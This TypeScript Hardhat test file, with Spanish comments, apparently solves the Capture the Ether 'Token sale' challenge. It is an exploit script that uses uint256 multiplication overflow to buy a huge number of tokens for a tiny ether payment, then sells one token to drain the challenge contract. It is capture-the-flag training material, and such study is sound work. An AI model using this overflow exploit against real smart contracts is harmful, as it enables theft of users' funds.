import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer, BigNumber } from "ethers";


let tokenSaleContract: Contract;
const challengeAddress: string = "0xe62F507aA3c232d1a4783a3fE63de9E0A54ddB2A" //Address a usar cuando se intente resolver el challenge con el contrato de CTE, no el deployado localmente.
let eoa: Signer
let accounts: Signer[];
const MAX_UINT256_NUMBER: BigNumber = BigNumber.from(`2`).pow(`256`);
const ONE_ETHER: BigNumber = BigNumber.from(`10`).pow(`18`);

beforeEach(async () => {
  accounts = await ethers.getSigners()

  const tokenSaleFactory = await ethers.getContractFactory("TokenSaleChallenge");
  tokenSaleContract = tokenSaleFactory.attach(challengeAddress);
})

describe("Token sale", async () => {
  it("Resuelve el Math challenge - Token sale", async () => {

    const buyValue: BigNumber = BigNumber.from(MAX_UINT256_NUMBER).div(ONE_ETHER).add(`1`);
    console.log(`EL VALOR A COMPRAR ES: ${buyValue}`);

    
    const etherToSendCalc: BigNumber = BigNumber.from(buyValue).mul(ONE_ETHER).sub(MAX_UINT256_NUMBER);
    const etherToSendValue = ethers.utils.formatEther(etherToSendCalc.toString());
    console.log(`CANTIDAD DE ETHER A ENVIAR ES: ${etherToSendValue}`);
    
    await tokenSaleContract.buy(buyValue, {
      value: ethers.utils.parseEther(etherToSendValue.toString()),
      gasLimit: 1e5
    });

    await tokenSaleContract.sell(1, {gasLimit:1e5});

    let isComplete = await tokenSaleContract.isComplete();
    expect(isComplete, "DESAFÍO INCOMPLETO").to.be.true;
  })
})